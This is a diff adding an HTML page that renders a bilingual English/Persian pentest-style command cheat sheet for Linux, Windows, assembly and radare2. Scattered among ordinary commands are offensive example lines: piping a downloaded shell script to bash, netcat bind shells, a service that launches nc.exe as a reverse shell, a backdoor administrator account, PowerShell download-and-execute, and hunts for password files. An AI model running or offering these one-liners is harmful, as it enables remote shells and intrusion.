@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mr. SAM</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Vazirmatn:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --background: #0d0c1d;
+            --window-bg: #1a1a2e;
+            --title-bar: #16213e;
+            --foreground: #e0e0e0;
+            --cyan: #00e5ff;
+            --green: #50fa7b;
+            --red: #ff5555;
+            --purple: #bd93f9;
+            --comment: #6272a4;
+            --font-primary: 'Fira Code', monospace;
+            --font-secondary: 'Vazirmatn', sans-serif;
+        }
+
+        * { box-sizing: border-box; }
+
+        html, body {
+            background-color: var(--background);
+            color: var(--foreground);
+            font-family: var(--font-primary);
+            font-size: 16px;
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        #terminal-window {
+            width: 90%;
+            height: 90vh;
+            max-width: 1200px;
+            background-color: var(--window-bg);
+            border: 1px solid var(--purple);
+            border-radius: 8px;
+            box-shadow: 0 0 25px rgba(189, 147, 249, 0.3);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        #terminal-window::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15), rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px);
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        .title-bar {
+            background-color: var(--title-bar);
+            color: var(--foreground);
+            padding: 8px 12px;
+            font-weight: bold;
+            border-bottom: 1px solid var(--purple);
+            text-align: center;
+            cursor: default;
+        }
+        .title-bar .controls { float: left; }
+
+        #terminal {
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+            padding: 15px;
+            overflow-y: auto;
+            word-wrap: break-word;
+        }
+        
+        #terminal::-webkit-scrollbar { width: 8px; }
+        #terminal::-webkit-scrollbar-track { background: var(--window-bg); }
+        #terminal::-webkit-scrollbar-thumb { background: var(--purple); border-radius: 4px; }
+        #terminal::-webkit-scrollbar-thumb:hover { background: var(--cyan); }
+
+        .input-line { display: flex; align-items: center; }
+
+        .prompt {
+            color: var(--cyan);
+            font-weight: bold;
+            text-shadow: 0 0 5px var(--cyan);
+            margin-right: 8px;
+            white-space: nowrap;
+        }
+        
+        .prompt .user { color: var(--green); }
+
+        #command-input {
+            background: transparent;
+            border: none;
+            color: var(--foreground);
+            font-family: inherit;
+            font-size: inherit;
+            outline: none;
+            width: 100%;
+            text-shadow: 0 0 2px var(--foreground);
+        }
+
+        #cursor {
+            display: inline-block;
+            background-color: var(--green);
+            width: 10px;
+            height: 1.2em;
+            vertical-align: middle;
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            from, to { background-color: transparent; }
+            50% { background-color: var(--green); }
+        }
+
+        .output-line { white-space: pre-wrap; margin-bottom: 2px; }
+        .output-line.command { color: var(--foreground); }
+        .output-line.error { color: var(--red); text-shadow: 0 0 5px var(--red); }
+        .output-line.info, .output-line b, .output-line strong { color: var(--cyan); text-shadow: 0 0 4px var(--cyan); }
+        
+        .command-section h3, .output-line h3 {
+            color: var(--green);
+            text-shadow: 0 0 5px var(--green);
+            border-bottom: 1px solid var(--green);
+            padding-bottom: 5px; margin-top: 20px; font-size: 1.2em;
+        }
+        .command-section h4 {
+            color: var(--purple);
+            margin-top: 20px; margin-bottom: 10px;
+            border-left: 3px solid var(--purple); padding-left: 8px;
+        }
+        .command-item {
+            margin-bottom: 15px; border-left: 2px solid var(--comment);
+            padding-left: 10px; break-inside: avoid-column;
+        }
+        .command-item b { color: var(--cyan); }
+        .command-item .desc { color: #b0bec5; font-size: 0.9em; margin-left: 5px; }
+
+        .lang-fa {
+            font-family: var(--font-secondary);
+            direction: rtl; text-align: right; display: block;
+            margin-top: 4px; color: #b0bec5; text-shadow: none;
+        }
+        
+        .example {
+            background: #1c1c1c;
+            padding: 8px;
+            border-radius: 5px;
+            margin-top: 5px;
+            font-size: 0.9em;
+            color: #d0d0d0;
+            display: block;
+        }
+        .defense {
+            color: #ff5555;
+            font-style: italic;
+            margin-top: 5px;
+            font-size: 0.9em;
+            display: block;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            font-size: 0.9em;
+        }
+        th, td {
+            border: 1px solid var(--comment);
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background: var(--title-bar);
+            color: var(--green);
+        }
+        td { background: #2a2a2e; }
+        td .lang-fa, th .lang-fa { text-align: right; }
+
+        @media (max-width: 600px) {
+            body { display: block; padding: 0; }
+            #terminal-window {
+                width: 100%; height: 100vh;
+                max-width: none; border-radius: 0;
+                border: none; box-shadow: none;
+            }
+            .title-bar .controls { display: none; }
+            #terminal { padding: 10px; }
+            body { font-size: 14px; }
+            .output-line pre { font-size: 0.8em; }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="terminal-window">
+        <div class="title-bar"><span class="controls"> </span> 🔴 🟡 🟢 </div>
+        <div id="terminal">
+            <div id="output"></div>
+            <div class="input-line">
+                <span id="prompt" class="prompt"><span class="user">Command: </span>:~$</span>
+                <input type="text" id="command-input" autocomplete="off" spellcheck="false" disabled>
+                <span id="cursor"></span>
+            </div>
+        </div>
+    </div>
+    
+    
+<div id="commands-data" style="display: none;">
+    <div id="ascii-art">
+    <pre style="color: var(--cyan); text-shadow: 0 0 5px var(--cyan);">
+███╗   ███╗██████╗        ███████╗ █████╗ ███╗   ███╗
+████╗ ████║██╔══██╗       ██╔════╝██╔══██╗████╗ ████║
+██╔████╔██║██████╔╝       ███████╗███████║██╔████ ██║
+██║╚██╔╝██║██╔══██╗       ╚════██║██╔══██║██║╚██╔╝██║
+██║ ╚═╝ ██║██║  ██║██     ███████║██║  ██║██ ╚═╝  ██║
+╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝       ╚═╝  ╚═╝╚═╝     ╚═╝
+    </pre>
+    </div>
+    <div id="help-main">
+        Use '<b>search &lt;keyword&gt;</b>' to find a command across all categories.
+        <span class="lang-fa">برای یافتن یک دستور در تمام دسته‌بندی‌ها، از '<b>search &lt;keyword&gt;</b>' استفاده کنید.</span>
+        <br>
+        Type a category name to see its commands. Type '<b>help</b>' or '<b>راهنما</b>' to see this message again.
+        <span class="lang-fa">نام یک دسته‌بندی را برای دیدن دستورات آن تایپ کنید. برای مشاهده مجدد این پیام، '<b>help</b>' یا '<b>راهنما</b>' را تایپ کنید.</span>
+        <br>
+        <b>linux</b><span class="desc">- Linux Shell (Bash) Commands <span class="lang-fa"> (دستورات شل لینوکس)</span></span>
+        <b>windows</b><span class="desc">- Windows CMD & PowerShell Commands <span class="lang-fa"> (دستورات CMD و پاورشل ویندوز)</span></span>
+        <b>asm</b><span class="desc">- Assembly (x86/x64 & Smali) <span class="lang-fa"> (دستورات اسمبلی)</span></span>
+        <b>reversing</b><span class="desc">- Radare2 / Cutter Commands <span class="lang-fa"> (دستورات مهندسی معکوس)</span></span>
+        <b>compare</b><span class="desc">- Command Comparison Table <span class="lang-fa"> (جدول مقایسه دستورات)</span></span>
+        <br>
+        Online interactive commands: <b>whoami</b>, <b>ip</b>, <b>date</b>, <b>clear</b>
+        <span class="lang-fa">دستورات تعاملی آنلاین: <b>من کی هستم</b>, <b>آی پی</b>, <b>زمان</b>, <b>پاک شود</b></span>
+    </div>
+
+    <div id="help-linux" class="command-section">
+        <h3>🔹 1. Linux Shell (Bash)</h3>
+        <h4>Navigation & File Management</h4>
+        <div class="command-item"><b>ls, cd, pwd</b><div>Core navigation commands.</div><div class="lang-fa">دستورات اصلی ناوبری.</div><code class="example">ls -la, cd /var/www, pwd</code></div>
+        <div class="command-item"><b>mkdir, rmdir</b><div>Make directory, remove empty directory.</div><div class="lang-fa">ساختن دایرکتوری، حذف دایرکتوری خالی.</div><code class="example">mkdir new_dir, rmdir old_dir</code></div>
+        <div class="command-item"><b>rm, cp, mv</b><div>Remove, copy, move/rename files and directories.</div><div class="lang-fa">حذف، کپی و انتقال/تغییرنام فایل‌ها و دایرکتوری‌ها.</div><code class="example">rm -rf /tmp/data, cp id_rsa ~/.ssh/, mv file.txt doc.txt</code></div>
+        <div class="command-item"><b>touch, echo</b><div>Create an empty file; print text.</div><div class="lang-fa">ساخت فایل خالی؛ چاپ کردن متن.</div><code class="example">touch file.log, echo "root:toor" > creds.txt</code></div>
+        <div class="command-item"><b>find, locate</b><div>Search for files by name/properties or a pre-built database.</div><div class="lang-fa">جستجوی فایل بر اساس نام/ویژگی یا با دیتابیس.</div><code class="example">find / -name "config.php", locate authorized_keys</code></div>
+        <div class="command-item"><b>tar, zip, unzip</b><div>Archiving and compression utilities.</div><div class="lang-fa">ابزارهای آرشیو و فشرده‌سازی.</div><code class="example">tar -czvf backup.tar.gz /var/www, zip -r a.zip .</code></div>
+        
+        <h4>Text Processing</h4>
+        <div class="command-item"><b>grep</b><div>Searches for patterns in text.</div><div class="lang-fa">الگوهای متنی را جستجو می‌کند.</div><code class="example">grep -r "password" /etc, ps aux | grep -i "nginx"</code></div>
+        <div class="command-item"><b>awk, sed</b><div>Pattern scanning/processing language; stream editor.</div><div class="lang-fa">زبان پردازش متن مبتنی بر الگو؛ ویرایشگر جریانی.</div><code class="example">awk -F':' '{print $1}' /etc/passwd, sed -i 's/127.0.0.1/0.0.0.0/' /etc/mysql/my.cnf</code></div>
+        <div class="command-item"><b>cut, tr</b><div>Remove sections from lines; translate or delete characters.</div><div class="lang-fa">حذف بخش‌هایی از خطوط؛ ترجمه یا حذف کاراکترها.</div><code class="example">cat /etc/passwd | cut -d':' -f1, echo "HeLLo" | tr 'A-Z' 'a-z'</code></div>
+        <div class="command-item"><b>sort, uniq</b><div>Sort lines; report or omit repeated lines.</div><div class="lang-fa">مرتب‌سازی خطوط؛ گزارش یا حذف خطوط تکراری.</div><code class="example">sort names.txt | uniq -c</code></div>
+        <div class="command-item"><b>xargs</b><div>Build and execute command lines from standard input.</div><div class="lang-fa">ساخت و اجرای دستورات از ورودی استاندارد.</div><code class="example">find . -name "*.log" | xargs rm -f</code></div>
+
+        <h4>Process & System Management</h4>
+        <div class="command-item"><b>ps, top, htop</b><div>Snapshot of current processes; dynamic real-time view.</div><div class="lang-fa">نمایش وضعیت فعلی و پویای پردازش‌ها.</div><code class="example">ps aux, top -n 1, htop -u root</code></div>
+        <div class="command-item"><b>kill, killall</b><div>Send a signal to a process; kill processes by name.</div><div class="lang-fa">ارسال سیگنال به پردازش؛ خاتمه پردازش بر اساس نام.</div><code class="example">kill -9 1234, killall apache2</code></div>
+        <div class="command-item"><b>apt, yum, dpkg</b><div>Package handlers for Debian/RedHat systems.</div><div class="lang-fa">مدیر پکیج برای سیستم‌های مبتنی بر دبیان/ردهت.</div><code class="example">apt install nmap, yum install tmux, dpkg -i package.deb</code></div>
+
+        <h4>Permissions & User Management</h4>
+        <div class="command-item"><b>chmod, chown</b><div>Change file permissions; change file owner/group.</div><div class="lang-fa">تغییر سطح دسترسی فایل؛ تغییر مالک/گروه فایل.</div><code class="example">chmod 700 secret.sh, chown www-data:www-data config.php</code></div>
+        <div class="command-item"><b>whoami, id</b><div>Print current user/group information.</div><div class="lang-fa">نمایش اطلاعات کاربر و گروه‌های فعلی.</div><code class="example">whoami, id -a</code></div>
+        <div class="command-item"><b>useradd, usermod</b><div>Create or modify a user account.</div><div class="lang-fa">ساخت یا تغییر یک حساب کاربری.</div><code class="example">useradd -m -s /bin/bash temp, usermod -aG sudo temp</code></div>
+        <div class="command-item"><b>su, sudo</b><div>Switch user; execute a command as another user.</div><div class="lang-fa">تغییر کاربر؛ اجرای دستور به عنوان کاربر دیگر.</div><code class="example">su - john, sudo /bin/bash</code></div>
+
+        <h4>Networking</h4>
+        <div class="command-item"><b>ping, traceroute</b><div>Check connectivity; trace packet route.</div><div class="lang-fa">بررسی اتصال؛ ردیابی مسیر بسته‌ها.</div><code class="example">ping -c 4 8.8.8.8, traceroute google.com</code></div>
+        <div class="command-item"><b>curl, wget</b><div>Transfer data from/to a server; non-interactive downloader.</div><div class="lang-fa">انتقال داده از/به سرور؛ دانلودر غیرتعاملی.</div><code class="example">curl http://example.com/shell.sh | bash, wget http://server/payload.exe</code></div>
+        <div class="command-item"><b>netcat (nc)</b><div>The "Swiss army knife" for TCP/IP networking.</div><div class="lang-fa">"چاقوی سوئیسی" برای کارهای شبکه‌ای.</div><code class="example">nc -lnvp 4444 -e /bin/bash, nc 10.10.10.5 22</code></div>
+        <div class="command-item"><b>ss, ip, ifconfig</b><div>Investigate sockets; show/manipulate network devices.</div><div class="lang-fa">بررسی سوکت‌ها؛ نمایش/دستکاری دستگاه‌های شبکه.</div><code class="example">ss -tulpn, ip a, ifconfig eth0</code></div>
+        <div class="command-item"><b>nmap</b><div>Network exploration tool and security scanner.</div><div class="lang-fa">ابزار اسکن شبکه و پویشگر امنیتی.</div><code class="example">nmap -sV -sC -p- 192.168.1.10</code></div>
+    </div>
+
+    <div id="help-windows" class="command-section">
+        <h3>🔹 2. Windows CMD & PowerShell</h3>
+        <h4>Windows CMD</h4>
+        <div class="command-item"><b>dir, cd</b><div>List directory contents; change directory.</div><div class="lang-fa">لیست کردن محتوای دایرکتوری؛ تغییر دایرکتوری.</div><code class="example">dir /a /s /b *.exe, cd C:\Windows\System32</code></div>
+        <div class="command-item"><b>md, rd</b><div>Make directory; remove directory.</div><div class="lang-fa">ساخت دایرکتوری؛ حذف دایرکتوری.</div><code class="example">md "new folder", rd /s /q "old folder"</code></div>
+        <div class="command-item"><b>del, copy, move</b><div>Delete, copy, or move files.</div><div class="lang-fa">حذف، کپی یا انتقال فایل‌ها.</div><code class="example">del /f /q config.ini, copy nc.exe C:\Windows, move p.dll C:\Users\Public</code></div>
+        <div class="command-item"><b>tasklist, taskkill</b><div>List running processes; terminate a process.</div><div class="lang-fa">لیست کردن پردازش‌های در حال اجرا؛ خاتمه دادن یک پردازش.</div><code class="example">tasklist /svc, taskkill /F /PID 1234</code></div>
+        <div class="command-item"><b>sc</b><div>Service Control utility. Manage services.</div><div class="lang-fa">ابزار کنترل سرویس. برای مدیریت سرویس‌ها.</div><code class="example">sc qc spooler, sc create revshell binPath= "C:\tmp\nc.exe -e cmd.exe ..."</code></div>
+        <div class="command-item"><b>net user, net accounts</b><div>Manages user accounts and policies.</div><div class="lang-fa">مدیریت حساب‌های کاربری و سیاست‌ها.</div><code class="example">net user hacker P@ssw0rd! /add, net localgroup administrators hacker /add</code></div>
+        <div class="command-item"><b>net use, net view</b><div>Connect to shared resources; list domains/computers.</div><div class="lang-fa">اتصال به منابع اشتراکی؛ لیست کردن دامین‌ها/کامپیوترها.</div><code class="example">net use Z: \\\\192.168.1.100\\share, net view</code></div>
+        <div class="command-item"><b>ipconfig, ping, tracert</b><div>Display network config and test connectivity.</div><div class="lang-fa">نمایش تنظیمات شبکه و تست اتصال.</div><code class="example">ipconfig /all, tracert 8.8.8.8</code></div>
+        <div class="command-item"><b>netstat</b><div>Displays active TCP connections and listening ports.</div><div class="lang-fa">نمایش اتصالات فعال TCP و پورت‌های در حال شنود.</div><code class="example">netstat -anob</code></div>
+        <div class="command-item"><b>arp, nslookup</b><div>Displays ARP cache; queries DNS.</div><div class="lang-fa">نمایش کش ARP؛ ارسال کوئری به DNS.</div><code class="example">arp -a, nslookup internal.corp</code></div>
+
+        <h4>PowerShell</h4>
+        <div class="command-item"><b>Get-ChildItem (ls, dir)</b><div>Gets items in specified locations.</div><div class="lang-fa">آیتم‌ها را در مسیرهای مشخص شده دریافت می‌کند.</div><code class="example">Get-ChildItem -Path C:\Users -Recurse -Include *.kdbx -Force</code></div>
+        <div class="command-item"><b>Get-Process, Start-Process, Stop-Process</b><div>Get, start, or stop running processes.</div><div class="lang-fa">دریافت، شروع یا توقف پردازش‌ها.</div><code class="example">Get-Process | ? {$_.MainWindowTitle}, Stop-Process -Name "chrome" -Force</code></div>
+        <div class="command-item"><b>Test-NetConnection (tnc)</b><div>Displays diagnostic information for a connection.</div><div class="lang-fa">اطلاعات تشخیصی یک اتصال را نمایش می‌دهد.</div><code class="example">tnc -ComputerName fileserver01 -Port 445</code></div>
+        <div class="command-item"><b>Get-NetTCPConnection</b><div>Gets current TCP connections.</div><div class="lang-fa">اتصالات TCP فعلی را دریافت می‌کند.</div><code class="example">Get-NetTCPConnection -State Listen</code></div>
+        <div class="command-item"><b>Get-ItemProperty</b><div>Retrieves properties of an item (e.g., registry key).</div><div class="lang-fa">ویژگی‌های یک آیتم (مانند کلید رجیستری) را بازیابی می‌کند.</div><code class="example">Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"</code></div>
+        <div class="command-item"><b>Invoke-Command, Enter-PSSession</b><div>Run commands on remote computers or start an interactive session.</div><div class="lang-fa">اجرای دستورات روی کامپیوتر راه دور یا شروع جلسه تعاملی.</div><code class="example">Invoke-Command -ComputerName DC01 -ScriptBlock { Get-Process powershell }</code></div>
+        <div class="command-item"><b>Invoke-Expression (IEX)</b><div>Executes a string or command. Used for payload delivery.</div><div class="lang-fa">یک رشته یا دستور را اجرا می‌کند. برای اجرای پیلود استفاده می‌شود.</div><code class="example">IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/s.ps1')</code></div>
+    </div>
+
+    <div id="help-asm" class="command-section">
+        <h3>🔹 3. Assembly (x86/x64 & Smali)</h3>
+        <h4>x86/x64 Assembly</h4>
+        <div class="command-item"><b>mov</b><div>Moves data from a source to a destination.</div><div class="lang-fa">داده را از یک مبدا به یک مقصد منتقل می‌کند.</div><code class="example">mov eax, ebx ; mov [eax], ecx</code></div>
+        <div class="command-item"><b>add, sub, inc, dec</b><div>Arithmetic operations (add, subtract, increment, decrement).</div><div class="lang-fa">عملیات محاسباتی (جمع، تفریق، افزایش، کاهش).</div><code class="example">add eax, 10 ; dec dword ptr [ebp-4]</code></div>
+        <div class="command-item"><b>xor, and, or</b><div>Bitwise logical operations.</div><div class="lang-fa">عملیات منطقی بیتی.</div><code class="example">xor eax, eax ; (Zeroes out the register)</code></div>
+        <div class="command-item"><b>jmp, je, jne, cmp</b><div>Jump instructions based on comparisons.</div><div class="lang-fa">دستورات پرش بر اساس مقایسه.</div><code class="example">cmp eax, ebx ; je success_label</code></div>
+        <div class="command-item"><b>call, ret</b><div>Calls and returns from a procedure (function).</div><div class="lang-fa">فراخوانی و بازگشت از یک رویه (تابع).</div><code class="example">call read_file ; ret</code></div>
+        <div class="command-item"><b>push, pop</b><div>Pushes/pops an operand onto/from the stack.</div><div class="lang-fa">قرار دادن/برداشتن عملوند روی/از پشته.</div><code class="example">push eax ; pop ebx</code></div>
+        <div class="command-item"><b>syscall / int 0x80</b><div>Triggers a kernel system call.</div><div class="lang-fa">فعال‌سازی یک فراخوانی سیستمی هسته.</div><code class="example">mov eax, 1 ; (sys_exit in 32-bit Linux)</code></div>
+        <div class="command-item"><b>Shellcode</b><div>A small piece of code used as a payload in exploitation.</div><div class="lang-fa">قطعه کد کوچکی که به عنوان پیلود در بهره‌برداری استفاده می‌شود.</div><code class="example">Typically must be null-free and position-independent.</code></div>
+        
+        <h4>Smali (Android DEX Assembly)</h4>
+        <div class="command-item"><b>invoke-virtual / -static / -direct</b><div>Invokes a non-static, static, or private/constructor method.</div><div class="lang-fa">فراخوانی یک متد غیر استاتیک، استاتیک یا خصوصی/سازنده.</div><code class="example">invoke-static {v1}, Landroid/util/Base64;->decode(Ljava/lang/String;)[B</code></div>
+        <div class="command-item"><b>const-string</b><div>Loads a literal string into a register.</div><div class="lang-fa">یک رشته متنی را در یک رجیستر بارگذاری می‌کند.</div><code class="example">const-string v0, "API_KEY_SECRET"</code></div>
+        <div class="command-item"><b>iget, iput / sget, sput</b><div>Gets/sets the value of an instance or static field.</div><div class="lang-fa">دریافت/تنظیم مقدار یک فیلد غیر استاتیک یا استاتیک.</div><code class="example">iget-object v0, p0, Lcom/example/User;->name:Ljava/lang/String;</code></div>
+        <div class="command-item"><b>move-result</b><div>Moves the result of the previous invoke into a register.</div><div class="lang-fa">انتقال نتیجه آخرین دستور `invoke` به یک رجیستر.</div><code class="example">invoke-virtual {p0}, Lcom/a/b;->getFlag()I; move-result v0</code></div>
+        <div class="command-item"><b>return-void / return-object</b><div>Returns from a method.</div><div class="lang-fa">بازگشت از یک متد.</div><code class="example">return-object v0</code></div>
+        <div class="command-item"><b>apktool</b><div>A tool for reverse engineering Android apk files.</div><div class="lang-fa">ابزاری برای مهندسی معکوس فایل‌های APK اندروید.</div><code class="example">apktool d myapp.apk; apktool b myapp_dir -o newapp.apk</code></div>
+    </div>
+
+    <div id="help-reversing" class="command-section">
+        <h3>🔹 4. radare2 / rizin / Cutter</h3>
+        <h4>Setup & Analysis</h4>
+        <div class="command-item"><b>r2 -w &lt;file&gt;</b><div>Opens a file in read-write mode for patching.</div><div class="lang-fa">باز کردن فایل در حالت خواندن-نوشتن برای پچ کردن.</div><code class="example">r2 -w libnative.so</code></div>
+        <div class="command-item"><b>aaa</b><div>"Analyze All". Performs an automatic analysis of the binary.</div><div class="lang-fa">"تحلیل همه". یک تحلیل خودکار از باینری انجام می‌دهد.</div><code class="example">Open file and run 'aaa' as the first step.</code></div>
+        <div class="command-item"><b>iI, ii, ie</b><div>Shows binary info, imports, and entry points.</div><div class="lang-fa">نمایش اطلاعات باینری، واردات و نقاط ورود.</div><code class="example">iI ; ii ; ie</code></div>
+        <div class="command-item"><b>iz, izz</b><div>Lists strings from data section or the entire binary.</div><div class="lang-fa">لیست رشته‌ها از بخش داده یا کل باینری.</div><code class="example">izz | grep -i "password"</code></div>
+        
+        <h4>Navigation & Disassembly</h4>
+        <div class="command-item"><b>afl</b><div>"Analyze Function List". Lists all identified functions.</div><div class="lang-fa">"لیست توابع تحلیلی". لیست تمام توابع شناسایی شده.</div><code class="example">afl | grep main</code></div>
+        <div class="command-item"><b>s &lt;addr&gt;</b><div>"Seek". Changes the current offset to a new location.</div><div class="lang-fa">"جستجو". تغییر آفست فعلی به مکان جدید.</div><code class="example">s main, s 0x00401120</code></div>
+        <div class="command-item"><b>pdf @ &lt;func&gt;</b><div>"Print Disassembly Function". Disassembles a function's code.</div><div class="lang-fa">"چاپ دیس‌اسمبلی تابع". کد یک تابع را دیس‌اسمبل می‌کند.</div><code class="example">pdf @ main</code></div>
+        <div class="command-item"><b>agf / VV</b><div>Displays function's control flow graph or enters visual graph mode.</div><div class="lang-fa">نمایش گراف جریان کنترل تابع یا ورود به حالت گراف تعاملی.</div><code class="example">agf @ main, VV @ main</code></div>
+        <div class="command-item"><b>afn</b><div>"Analyze Function Name". Renames a function.</div><div class="lang-fa">"تحلیل نام تابع". تغییر نام یک تابع.</div><code class="example">afn check_license @ fcn.00401234</code></div>
+        <div class="command-item"><b>/c &lt;string&gt;</b><div>Searches for all references to a string.</div><div class="lang-fa">تمام ارجاعات به یک رشته را جستجو می‌کند.</div><code class="example">/c "invalid license"</code></div>
+
+        <h4>Debugging</h4>
+        <div class="command-item"><b>ood</b><div>"Open in Debug mode". Reopens the file in debug mode.</div><div class="lang-fa">"باز کردن در حالت دیباگ". باز کردن مجدد فایل در حالت دیباگ.</div><code class="example">r2 -d /bin/ls; ood</code></div>
+        <div class="command-item"><b>db, dc, ds</b><div>Sets a breakpoint; continues execution; steps one instruction.</div><div class="lang-fa">نقطه توقف می‌گذارد؛ اجرا را ادامه می‌دهد؛ یک دستور را اجرا می‌کند.</div><code class="example">db main; dc; ds</code></div>
+    </div>
+    
+    <div id="help-compare" class="command-section">
+        <h3>Command Comparison Table</h3>
+        <table>
+            <tr>
+                <th>Function <span class="lang-fa">کارکرد</span></th>
+                <th>Linux <span class="lang-fa">لینوکس</span></th>
+                <th>Windows CMD <span class="lang-fa">ویندوز CMD</span></th>
+                <th>PowerShell <span class="lang-fa">پاورشل</span></th>
+            </tr>
+            <tr>
+                <td>List Directory <span class="lang-fa">لیست پوشه</span></td>
+                <td><code>ls -la</code></td>
+                <td><code>dir</code></td>
+                <td><code>Get-ChildItem</code></td>
+            </tr>
+            <tr>
+                <td>Show Processes <span class="lang-fa">نمایش فرآیندها</span></td>
+                <td><code>ps aux</code></td>
+                <td><code>tasklist</code></td>
+                <td><code>Get-Process</code></td>
+            </tr>
+             <tr>
+                <td>Terminate Process <span class="lang-fa">خاتمه فرآیند</span></td>
+                <td><code>kill -9 [PID]</code></td>
+                <td><code>taskkill /F /PID [PID]</code></td>
+                <td><code>Stop-Process -Id [PID]</code></td>
+            </tr>
+            <tr>
+                <td>Network Info <span class="lang-fa">اطلاعات شبکه</span></td>
+                <td><code>ip a</code> / <code>ifconfig</code></td>
+                <td><code>ipconfig /all</code></td>
+                <td><code>Get-NetIPConfiguration</code></td>
+            </tr>
+            <tr>
+                <td>Listening Ports <span class="lang-fa">پورت‌های در حال شنود</span></td>
+                <td><code>ss -tulpn</code></td>
+                <td><code>netstat -anob</code></td>
+                <td><code>Get-NetTCPConnection -State Listen</code></td>
+            </tr>
+            <tr>
+                <td>Download File <span class="lang-fa">دانلود فایل</span></td>
+                <td><code>wget</code> / <code>curl</code></td>
+                <td><code>certutil.exe</code></td>
+                <td><code>Invoke-WebRequest</code></td>
+            </tr>
+            <tr>
+                <td>Current User Info <span class="lang-fa">اطلاعات کاربر</span></td>
+                <td><code>id</code> / <code>whoami</code></td>
+                <td><code>whoami /groups</code></td>
+                <td><code>whoami</code> / <code>$env:UserName</code></td>
+            </tr>
+             <tr>
+                <td>Create User <span class="lang-fa">ایجاد کاربر</span></td>
+                <td><code>useradd</code></td>
+                <td><code>net user [u] [p] /add</code></td>
+                <td><code>New-LocalUser</code></td>
+            </tr>
+             <tr>
+                <td>Scheduled Tasks <span class="lang-fa">وظایف زمانبندی‌شده</span></td>
+                <td><code>crontab -l</code></td>
+                <td><code>schtasks /query</code></td>
+                <td><code>Get-ScheduledTask</code></td>
+            </tr>
+        </table>
+    </div>
+</div>
+
+
+
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const output = document.getElementById('output');
+            const commandInput = document.getElementById('command-input');
+            const terminal = document.getElementById('terminal');
+            const promptEl = document.getElementById('prompt');
+            const cursor = document.getElementById('cursor');
+
+            const commandHistory = [];
+            let historyIndex = -1;
+            const typingSpeed = 10;
+            let isTyping = false;
+            
+            const typeEffect = async (text, element, speed) => {
+                return new Promise(resolve => {
+                    let i = 0;
+                    const interval = setInterval(() => {
+                        if (i < text.length) {
+                            element.innerHTML += text.charAt(i);
+                            i++;
+                            terminal.scrollTop = terminal.scrollHeight;
+                        } else {
+                            clearInterval(interval);
+                            resolve();
+                        }
+                    }, speed);
+                });
+            };
+
+            const printToTerminal = async (text, type = 'output-line', useTyping = true) => {
+                const line = document.createElement('div');
+                if (type) line.classList.add(...type.split(' '));
+                output.appendChild(line);
+
+                if (useTyping && !text.includes('<')) {
+                    await typeEffect(text, line, typingSpeed);
+                } else {
+                    line.innerHTML = text;
+                }
+                terminal.scrollTop = terminal.scrollHeight;
+            };
+
+            const printPrompt = (command) => {
+                 const line = document.createElement('div');
+                 line.innerHTML = `<span class="prompt">${promptEl.innerHTML}</span> ${command}`;
+                 output.appendChild(line);
+            }
+
+         const executeCommand = async (command) => {
+                isTyping = true;
+                toggleInput(false);
+                printPrompt(command);
+
+                if (command.trim() !== '') {
+                   commandHistory.unshift(command);
+                   historyIndex = -1;
+                }
+
+                const [cmd, ...args] = command.toLowerCase().split(' ').filter(Boolean);
+                
+                const helpTopics = ['linux', 'windows', 'asm', 'reversing', 'compare'];
+
+                if (helpTopics.includes(cmd)) {
+                    const contentEl = document.getElementById(`help-${cmd}`);
+                    if (contentEl) {
+                        await printToTerminal(contentEl.innerHTML, 'output-line', false);
+                    }
+                } else {
+                    switch (command.toLowerCase().trim()) { // Use the full command for multi-word aliases
+                        case 'help':
+                        case 'راهنما':
+                            await printToTerminal(document.getElementById('help-main').innerHTML, 'output-line', false);
+                            break;
+
+                        case 'whoami':
+                        case 'من کی هستم':
+                            let info = `<b>== Browser & OS ==</b>\n`;
+                            info += `<b>User Agent:</b> ${navigator.userAgent}\n`;
+                            info += `<b>Platform:</b> ${navigator.platform}\n`;
+                            info += `<b>Languages:</b> ${navigator.languages.join(', ')}\n\n`;
+                            info += `<b>== Hardware & Connection ==</b>\n`;
+                            info += `<b>CPU Cores:</b> ${navigator.hardwareConcurrency || 'N/A'}\n`;
+                            info += `<b>Online Status:</b> ${navigator.onLine}\n`;
+                            info += `<b>Cookies Enabled:</b> ${navigator.cookieEnabled}`;
+                            await printToTerminal(info, 'info', false);
+                            break;
+                        
+                        case 'ip':
+                        case 'آی پی':
+                            await printToTerminal('Fetching IP info...', 'info', true);
+                            try {
+                                const response = await fetch('https://ipinfo.io/json');
+                                if (!response.ok) throw new Error('API request failed');
+                                const data = await response.json();
+                                const ipInfo = `<b>IP:</b> ${data.ip}\n<b>Location:</b> ${data.city}, ${data.country}\n<b>ISP:</b> ${data.org}`;
+                                await printToTerminal(ipInfo, 'info', false);
+                            } catch (error) {
+                                await printToTerminal('Error fetching IP info. Ad-blocker might be active.', 'error', true);
+                            }
+                            break;
+                    
+                        case 'date':
+                        case 'زمان':
+                             const now = new Date();
+                             const localGregorian = new Intl.DateTimeFormat('en-GB', { dateStyle: 'full', timeStyle: 'long', timeZone: 'Asia/Riyadh' }).format(now);
